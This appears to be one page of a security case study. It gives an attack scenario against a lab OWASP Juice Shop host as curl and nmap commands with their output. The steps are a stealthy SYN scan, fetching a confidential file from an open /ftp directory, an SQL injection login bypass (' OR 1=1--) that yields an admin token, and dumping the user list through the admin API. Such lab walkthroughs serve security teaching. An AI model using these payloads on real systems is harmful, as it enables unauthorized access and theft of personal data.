> Back to [case summary](README.md)

# Attack Scenario

## Phase 1 — Reconnaissance

```bash
# 1. Host discovery (ICMP)
ping -n 2 192.168.100.24

# 2. SYN scan, top-100 ports, slow timing (deliberately stealthy: -T2)
sudo nmap -sS --top-ports 100 -T2 192.168.100.24
# Result: 22/tcp open ssh, 80/tcp open http. 98 ports closed (RST).
# NOTE: nmap probed DB ports (1433, 3306) — they are CLOSED.

# 3. HTTP fingerprinting (noisy for the app, invisible for IDS)
curl -sI  http://192.168.100.24/            # Server: nginx/1.28.3 (Ubuntu)
curl -s   http://192.168.100.24/robots.txt  # Disallow: /ftp   <-- attacker's gift
```

## Phase 2 — Exploitation

```bash
# 4. Path traversal into the "hidden" directory (challenge: Confidential Document)
curl -s http://192.168.100.24/ftp/                  # 200 — directory listing OPEN
curl -s http://192.168.100.24/ftp/acquisitions.md   # 200 — confidential doc exfiltrated

# 5. SQL injection in the login form (challenge: Login Admin)
curl -s -X POST http://192.168.100.24/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}'
# Response: {"authentication":{"token":"eyJ0eXAiOiJKV1Qi..."}}
# Decoded JWT payload: {"data":{"id":1,"email":"admin@juice-sh.op","role":"admin",...}}
# → Full authentication bypass with a valid admin token.

# 6. Post-exploitation: mass PII exfiltration via authenticated admin API
curl -s -H "Authorization: Bearer $TOKEN" http://192.168.100.24/api/Users
# Response: full user list (emails, roles, registration dates)
```
